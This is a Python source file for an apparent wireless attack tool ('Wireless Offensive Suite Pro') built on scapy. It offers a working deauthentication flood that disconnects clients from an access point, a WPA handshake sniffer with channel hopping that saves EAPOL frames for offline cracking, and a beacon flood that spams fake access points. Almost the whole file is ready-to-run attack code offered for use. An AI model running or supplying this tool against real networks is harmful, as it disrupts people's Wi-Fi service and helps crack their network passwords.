import time
import os
import threading
import sys
import questionary
from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt, sendp, sniff, wrpcap, conf
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class WiFiSuite:
    def __init__(self):
        self.stop_hopping = threading.Event()

    def check_monitor_mode(self, iface):
        """Checks if the interface is actually in monitor mode."""
        # Simple check: Scapy's conf.iface might differ, we check via system
        try:
            # This is Linux specific; macOS handles monitor mode differently
            mode_path = f"/sys/class/net/{iface}/type"
            if os.path.exists(mode_path):
                with open(mode_path, 'r') as f:
                    # 803 is ARPHRD_IEEE80211_RADIOTAP (Monitor Mode)
                    if f.read().strip() != "803":
                        console.print(
                            f"[yellow][!] Warning: {iface} might not be in Monitor Mode.[/yellow]")
        except Exception:
            pass

    def channel_hopper(self, iface):
        """Hopping channels is required to find targets and capture handshakes."""
        channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
        while not self.stop_hopping.is_set():
            for channel in channels:
                if self.stop_hopping.is_set():
                    break
                os.system(f"iwconfig {iface} channel {channel}")
                time.sleep(0.5)

    def deauth_attack(self, target_mac, bssid, iface):
        """
        Sends deauthentication frames to disconnect a client.
        Reason 7: Class 3 frame received from nonassociated station.
        """
        # Packet from AP to Client
        pkt1 = RadioTap()/Dot11(addr1=target_mac, addr2=bssid,
                                addr3=bssid)/Dot11Deauth(reason=7)
        # Packet from Client to AP (Broadcast)
        pkt2 = RadioTap()/Dot11(addr1=bssid, addr2=target_mac,
                                addr3=bssid)/Dot11Deauth(reason=7)

        console.print(Panel(f"Target: {target_mac}\nAP: {bssid}\nIface: {iface}",
                            title="[bold red]Deauth Attack Active[/bold red]", border_style="red"))

        try:
            while True:
                sendp(pkt1, iface=iface, count=5, inter=0.1, verbose=False)
                sendp(pkt2, iface=iface, count=5, inter=0.1, verbose=False)
        except KeyboardInterrupt:
            console.print("\n[yellow][*] Deauth stopped.[/yellow]")

    def beacon_flood(self, iface):
        """Floods the vicinity with fake Access Points."""
        ssids = ["Free Public WiFi", "Home_Network_Ext",
                 "Starbucks_Unsecured", "FBI Surveillance Van"]
        pkts = []
        for s in ssids:
            # Generate a random-ish MAC for each SSID
            mac = "00:11:22:{:02x}:{:02x}:{:02x}".format(
                time.time_ns() % 255, time.time_ns() % 250, time.time_ns() % 245)
            dot11 = Dot11(type=0, subtype=8,
                          addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=s, len=len(s))
            # Tagged parameters for frequency/channel (Channel 1)
            dsset = Dot11Elt(ID="DSset", info="\x01")
            pkts.append(RadioTap()/dot11/beacon/essid/dsset)

        console.print(
            "[bold red][!] Flooding beacons. Interference started...[/bold red]")
        try:
            while True:
                for p in pkts:
                    sendp(p, iface=iface, count=1, verbose=False)
                time.sleep(0.1)
        except KeyboardInterrupt:
            return

    def capture_handshake(self, iface, bssid):
        """
        Passive handshake sniffer with EAPOL filtering.
        Optimized to capture the 4-way WPA handshake.
        """
        console.print(f"[*] Monitoring {bssid} for WPA Handshake...")

        # Start channel hopper in background to ensure we hit the right frequency
        self.stop_hopping.clear()
        hopper = threading.Thread(
            target=self.channel_hopper, args=(iface,), daemon=True)
        hopper.start()

        captured_handshakes = []

        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                # Check for EAPOL frames (0x888e)
                if pkt.haslayer('EAPOL'):
                    captured_handshakes.append(pkt)
                    console.print(
                        f"[bold green][+] Captured EAPOL Packet from {pkt.addr2}[/bold green]")

        try:
            sniff(iface=iface, prn=packet_handler, timeout=120, store=0)

            if captured_handshakes:
                if not os.path.exists("logs"):
                    os.makedirs("logs")
                fname = f"logs/handshake_{bssid.replace(':', '')}_{int(time.time())}.pcap"
                wrpcap(fname, captured_handshakes)
                console.print(
                    f"[bold green][!] Success: Handshake saved to {fname}[/bold green]")
            else:
                console.print(
                    "[red][!] Timeout: No handshake captured within 2 minutes.[/red]")

        finally:
            self.stop_hopping.set()

    def run(self):
        if os.getuid() != 0:
            return console.print("[red][!] Root required for raw socket WiFi operations.[/red]")

        draw_header("Wireless Offensive Suite Pro")
        iface = questionary.text(
            "Monitor Interface (e.g., wlan0mon):", style=Q_STYLE).ask()
        if not iface:
            return

        self.check_monitor_mode(iface)

        choice = questionary.select(
            "Select Attack Module:",
            choices=[
                "1. Deauth Target (Kick users)",
                "2. Capture WPA Handshake",
                "3. Beacon Flood (Fake APs)"
            ],
            style=Q_STYLE
        ).ask()

        if "Deauth" in choice:
            target = questionary.text(
                "Target Client MAC (FF:FF:FF:FF:FF:FF for all):", style=Q_STYLE).ask()
            bssid = questionary.text(
                "Access Point BSSID:", style=Q_STYLE).ask()
            self.deauth_attack(target, bssid, iface)
        elif "Capture" in choice:
            bssid = questionary.text("Target BSSID:", style=Q_STYLE).ask()
            self.capture_handshake(iface, bssid)
        elif "Beacon" in choice:
            self.beacon_flood(iface)


def run_wifi_suite():
    try:
        suite = WiFiSuite()
        suite.run()
    except Exception as e:
        console.print(f"[red][!] WiFi Suite Error: {e}[/red]")


if __name__ == "__main__":
    run_wifi_suite()
